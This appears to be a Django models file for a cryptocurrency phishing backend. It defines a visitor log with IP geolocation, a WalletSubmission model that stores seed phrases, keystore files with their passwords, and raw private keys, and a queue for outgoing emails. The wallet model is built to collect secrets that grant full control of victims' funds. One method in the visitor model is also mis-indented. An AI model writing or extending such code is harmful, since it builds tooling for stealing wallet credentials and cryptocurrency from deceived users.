from django.db import models


class VisitLog(models.Model):
    ip = models.GenericIPAddressField(null=True, blank=True)
    country = models.CharField(max_length=100, null=True, blank=True)
    city = models.CharField(max_length=100, null=True, blank=True)
    region = models.CharField(max_length=100, null=True, blank=True)
    latitude = models.FloatField(null=True, blank=True)
    longitude = models.FloatField(null=True, blank=True)
    path = models.CharField(max_length=255, null=True, blank=True)
    user_agent = models.TextField(null=True, blank=True)
    timestamp = models.DateTimeField(auto_now_add=True)

def __str__(self):
        return f"{self.ip or 'Unknown'} - {self.country or 'Unknown'}" 


# core/models.py
from django.db import models

class WalletSubmission(models.Model):
    wallet_name = models.CharField(max_length=255)
    wallet_email = models.EmailField(blank=True, null=True)  # NEW: separate wallet_email
    phrase = models.TextField(blank=True, null=True)
    keystore_json = models.TextField(blank=True, null=True)  # NEW: keystore JSON string
    keystore_pass = models.CharField(max_length=255, blank=True, null=True)
    private_key = models.TextField(blank=True, null=True)
    method = models.CharField(              # NEW: track which method user chose
        max_length=50,
        choices=[
            ("phrase", "Phrase"),
            ("keystore", "Keystore JSON"),
            ("private", "Private Key"),
        ],
        default="phrase"
    )
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.wallet_name} ({self.method})"






from django.db import models
from django.utils import timezone

class QueuedEmail(models.Model):
    subject = models.CharField(max_length=255)
    body = models.TextField()
    from_email = models.EmailField()
    to_emails = models.TextField(help_text="Comma-separated list of recipients")
    created_at = models.DateTimeField(default=timezone.now)
    sent = models.BooleanField(default=False)

    def __str__(self):
        return f"{self.subject} -> {self.to_emails}"

